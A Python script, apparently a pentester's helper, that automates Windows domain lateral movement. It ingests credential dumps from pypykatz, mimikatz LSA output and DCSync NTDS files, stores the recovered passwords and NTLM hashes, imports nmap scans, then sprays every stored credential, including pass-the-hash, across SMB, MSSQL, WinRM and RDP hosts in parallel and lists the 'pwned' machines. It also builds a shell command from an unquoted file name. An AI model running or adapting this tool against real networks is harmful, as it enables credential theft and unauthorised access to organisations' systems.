#!/usr/bin/python3
import os
import re
import io
import sys
import pdb
import json
import argparse
import subprocess
import pandas as pd
from lxml import etree
from termcolor import cprint
from tabulate import tabulate

import nthash
import parallel # borrowed from oswe-tools

class Manager:
    FILE = None
    cols = []
    dtype = {}

    def __init__(self):
        self.modified = False
        if self.FILE is None:
            raise NotImplementedError
        if os.path.exists(self.FILE):
            #print('[+] Load existing file')
            self.df = pd.read_csv(self.FILE, usecols=self.cols, dtype=self.dtype, na_filter=False)
        else:
            #print('[-] Create for you')
            self.df = pd.DataFrame([], columns=self.cols, dtype=str) # TODO: only accept one dtype in ctor
            self.modified = True
            self.export()
        self.init()

    def init(self):
        pass

    def export(self):
        if self.modified:
            self.df.fillna('', inplace=True)
            self.df.to_csv(self.FILE, index=False)
            print('[+] Export to "%s"' % (self.FILE))
            self.modified = False

    def _list(self, *args, **kwargs):
        return self.df.values.tolist()
    def list(self, *args, **kwargs):
        return self._list(*args, **kwargs)

    def __str__(self):
        return tabulate(self.df, headers='keys', tablefmt='psql')

class CredManager(Manager):
    FILE = 'credential.csv'
    cols = ['User', 'Pass', 'NTLM', 'Domain']
    dtype = {
        'User': str, 
        'Pass': str, 
        'NTLM': str, 
        'Domain': str
    }

    def init(self):
        changed = False
        for _, row in self.df.iterrows():
            if row['Pass'] and nthash.convert(row['Pass']) != row['NTLM']:
                self.df.at[_, 'NTLM'] = nthash.convert(row['Pass'])
                changed = True
        if changed:
            self.export()

    def _list(self, pwdOnly=False):
        # automatically skip machine account
        _df = self.df[self.df['User'].apply(lambda x: not x.endswith('$'))]
        if pwdOnly:
            return _df[_df['Pass'] != ''].values.tolist()
        return _df.values.tolist()

    def add(self, domain, username, password):
        if (self.df['Domain'] == domain).any() and (self.df['User'] == username).any() and (self.df['Pass'] == password).any():
            return
        self.modified = True
        self.df = self.df.append(dict(User=username, Pass=password, Domain=domain), ignore_index=True)
    def addH(self, domain, username, ntlm):
        if (self.df['Domain'] == domain).any() and (self.df['User'] == username).any() and (self.df['NTLM'] == ntlm).any():
            return
        self.modified = True
        self.df = self.df.append(dict(User=username, NTLM=ntlm, Domain=domain), ignore_index=True)

class HostManager(Manager):
    FILE = 'host.csv'
    cols = ['IP', 'HOST', 'Ports']
    dtype = {
        'IP': str, 
        'HOST': str, 
        'Ports': str, 
    }

    def merge_ports(self, _a, _b):
        return ' '.join(set(_a.split(' ')).union(set(_b.split(' '))))

    def add(self, ip, host=None, ports=None):
        # check exists
        if (self.df['IP'] == ip).any():
            for i in self.df.index[self.df['IP'] == ip].tolist():
                if host:
                    self.modified = True
                    self.df.at[i, 'HOST'] = host
                if ports:
                    self.modified = True
                    self.df.at[i, 'Ports'] = self.merge_ports(self.df.at[i, 'Ports'], ports)
            return
        
        self.modified = True
        self.df = self.df.append(dict(IP=ip, HOST=host, Ports=ports), ignore_index=True)

    def import_file(self, filename):
        # nmap -p80,443,445 -v -Pn -oX portscan.txt -iL host
        rt = etree.parse(filename)
        for host in rt.xpath('//host'):
            ip = host.xpath('.//address')[0].get('addr')
            _host = None
            for hostnametag in host.xpath('.//hostname[@name]'):
                _host = hostnametag.get('name')
            _ports = ' '.join([x.get('portid') for x in host.xpath('.//port[./state[@state="open"]]')])
            self.add(ip, _host, _ports)
        self.export()

class RecordManager(Manager):
    FILE = 'record.csv'
    cols = ['IP', 'User', 'Pass', 'NTLM', 'Domain', 'Protocol', 'Status']
    dtype = {
        'IP': str, 
        'User': str, 
        'Pass': str, 
        'NTLM': str, 
        'Domain': str, 
        'Protocol': str, 
        'Status': int, 
    }

    def add(self, item):
        if self.exists(item[:-1]):
            return
        self.modified = True
        self.df = self.df.append(dict(zip(self.cols, item)), ignore_index=True)
    def exists(self, item):
        for _, data in self.df.iterrows():
            eq = True
            for i, val in enumerate(item):
                eq &= val == data[self.cols[i]]
            if eq:
                #print(item)
                #print('[~] Skip tried combination')
                return True
        return False
    def canExec(self, ip=None, adminOnly=False, display=False):
        _df = pd.DataFrame(self.df[self.df['User'].apply(lambda x: not x.endswith('$'))], columns=self.cols)
        # cme smb pwned
        pwn_cme_smb = _df[(_df['Protocol'] == 'cme-smb') & (_df['Status'] == 2)]
        pwn_cme_winrm = _df[(_df['Protocol'] == 'cme-winrm') & (_df['Status'] == 2)]
        pwn_cme_mssqladm = _df[(_df['Protocol'] == 'cme-mssql') & (_df['Status'] == 2)]
        pwn_cme_mssql = _df[(_df['Protocol'] == 'cme-mssql') & (_df['Status'] == 1)]
        pwn_rdp = _df[(_df['Protocol'] == 'rdp') & (_df['Status'] == 1)]
        pwn_rdp = pwn_rdp.assign(NTLM='')

        # sam, lsa, dcsync pwned
        pwn_dump = _df[_df['Protocol'] == 'localdump']
        pwn_dumpadm = pwn_dump[(pwn_dump['Domain'] == '.') & (pwn_dump['User'] == 'Administrator')]
        pwn_dumpdu = pwn_dump[pwn_dump['Domain'] != '.']

        if adminOnly:
            pwndf = pd.concat([pwn_cme_smb, pwn_cme_winrm, pwn_cme_mssqladm, pwn_dumpadm])
        else:
            pwndf = pd.concat([pwn_cme_smb, pwn_cme_winrm, pwn_cme_mssql, pwn_cme_mssqladm, pwn_rdp, pwn_dumpadm, pwn_dumpdu])
        if ip is not None:
            pwndf = pwndf[pwndf['IP'] == ip]
        pwndf = pwndf.reset_index(drop=True)

        if display:
            print(tabulate(pwndf, headers='keys', tablefmt='psql'))

        return pwndf

def highlight(s, level=0):
    if level >= 2:
        cprint(s, 'yellow', attrs=['bold'])
    elif level >= 1:
        cprint(s, 'green', attrs=['bold'])
    else:
        cprint(s, 'blue')

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--cme', action='store_true')
    parser.add_argument('--rdp', action='store_true')
    parser.add_argument('--import-lsa', dest='_lsa')
    parser.add_argument('--import-ntds', dest='_ntds')
    parser.add_argument('--import-mini', dest='_minidump')
    parser.add_argument('--import-nmap', dest='_nmapXml')
    parser.add_argument('-t', '--itarget-ip', dest='itarget_ip', help='must be IPv4 format')
    parser.add_argument('-T', '--itarget-name', dest='itarget_name')
    parser.add_argument('--reset', action='store_true')
    #parser.add_argument('--init', action='store_true')
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--noproxy', action='store_true')
    return parser.parse_args()

args = parse_args()

if args.reset:
    files = [CredManager.FILE, HostManager.FILE, RecordManager.FILE]
    answer = input('Do you want to clear %s? [y/N] ' % ', '.join(files)).strip()
    if answer == 'y':
        for f in files:
            os.remove(f)
        print('Reset success')
    else:
        print('Canceled')
    exit(0)

cm = CredManager()
hm = HostManager()
rm = RecordManager()

if args._lsa or args._ntds or args._minidump:
    if args.itarget_ip is None:
        print('Please specify import target with `-t <ip>`')
        exit(0)
    if args.debug:
        print(cm)
        print(hm)
        print(rm)
    hm.add(args.itarget_ip, args.itarget_name)

if args._nmapXml:
    hm.import_file(args._nmapXml)

if args._minidump:
    print('Parsing `procdump`(--mini) result')
    pdump = subprocess.check_output('pypykatz lsa --json minidump "%s"' % args._minidump, shell=True).decode()
    pdump = json.loads(pdump)
    #df = pd.read_csv(io.StringIO(pdump), sep=':')
    pdump = next(iter(pdump.values()))
    for k, v in pdump['logon_sessions'].items():
        #pdb.set_trace()
        logon = v['logon_server']
        for msv in v['msv_creds']:
            if logon == msv['domainname']: # local
                _domain = '.'
            else: # domain
                _domain = msv['domainname']
            _user = msv['username']
            _ntlm = msv['NThash']

            cm.addH(_domain, _user, _ntlm)
            rm.add((args.itarget_ip, _user, '', _ntlm, _domain, 'localdump', 0))
    cm.export()

if args._lsa:
    print('Parsing `logonpasswords`(--lsa) result')
    builtinkeys = ['dpapi_machinekey', 'dpapi_userkey', 'NL$KM']
    with open(args._lsa) as f:
        for line in f:
            line = line.strip()
            m = re.match(r'([^:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::', line)
            if m is not None:
                _domain, _user, _ntlm = '.', m.group(1), m.group(2)
                if '\\' in _user:
                    _domain, _user = _user.split('\\', 1)
                elif _user in ['WDAGUtilityAccount', 'DefaultAccount', 'Guest']:
                    continue

                cm.addH(_domain, _user, _ntlm)
                rm.add((args.itarget_ip, _user, '', _ntlm, _domain, 'localdump', 1))
            if line.count(':') == 1: # clear-text password
                du, _pass = line.split(':')
                if du in builtinkeys:
                    continue
                _domain = _user = ''
                if '\\' in du:
                    _domain, _user = du.split('\\', 1)
                else:
                    _user, _domain = du.split('@', 1)
                cm.add(_domain, _user, _pass)
                rm.add((args.itarget_ip, _user, _pass, '', _domain, 'localdump', 1))
        cm.export()

if args._ntds:
    print('Parsing `dcsync`(--ntds) result')
    with open(args._ntds) as f:
        for line in f:
            line = line.strip()
            m = re.match(r'([^:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::', line)
            _domain, _user, _ntlm = '.', m.group(1), m.group(2)
            if '\\' in _user:
                _domain, _user = _user.split('\\', 1)
            cm.addH(_domain, _user, _ntlm)
            rm.add((args.itarget_ip, _user, '', _ntlm, _domain, 'localdump', 2))
        cm.export()

print(cm)
print(hm)
print('\n==== RCE machines ====')
rm.canExec(display=True)
print('======================')

if args.cme:
    import cmecheck
    candidates = [
        ('smb', '445'),
        ('mssql', '1433'),
        ('winrm', '5985')
    ]
    for proto, port in candidates:
        queue = []
        for ip, host, portsS in hm.list():
            ports = portsS.split(' ')
            if len(rm.canExec(ip=ip, adminOnly=True)) > 0: # skip pwned machine
                continue
            if port not in ports:
                continue
            isInternal = ip.startswith('172') and (not args.noproxy)
            for u, p, n, d in cm.list():
                if rm.exists((ip, u, p, n, d, 'cme-' + proto)):
                    continue

                queue.append((ip, u, p, n, d, isInternal))
        def cme_run(_):
            ip, u, p, n, d, isInternal = _
            status = cmecheck.run(ip, username=u, password=p, ntlm=n, domain=d, useProxy=isInternal, module=proto)
            rm.add((ip, u, p, n, d, 'cme-' + proto, status))
            d = d or '.'
            c = p or n
            if status == 2:
                highlight('[+][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, c, ip), 2)
                #break
            elif status == 1:
                highlight('[|][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, c, ip), 1)
            elif status == 0:
                print('[-][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, c, ip))
        if len(queue) > 0:
            parallel.run(cme_run, queue, verb=True)

if args.rdp:
    import rdpcheck
    proto = 'rdp'
    queue = []
    for ip, host, portsS in hm.list():
        ports = portsS.split(' ')
        if len(rm.canExec(ip=ip, adminOnly=True)) > 0: # skip pwned machine
            continue
        if '3389' not in ports:
            continue
        isInternal = ip.startswith('172') and (not args.noproxy)
        for u, p, _, d in cm.list():
            #if d and not p: # preserve local user(?) only
            #    continue
            if not p:
                continue
            if rm.exists((ip, u, p, _, d, proto)):
                continue
            queue.append((ip, u, p, d, isInternal))
    def rdp_run(_):
        ip, u, p, d, isInternal = _
        status = rdpcheck.run(ip, username=u, password=p, domain=d, useProxy=isInternal)
        rm.add((ip, u, p, _, d, proto, status))
        d = d or '.'
        if status == 1:
            highlight('[+][rdp] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip), 1)
        elif status == 0:
            print('[-][rdp] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip))
    if len(queue) > 0:
        parallel.run(rdp_run, queue, verb=True)

hm.export()
rm.export()
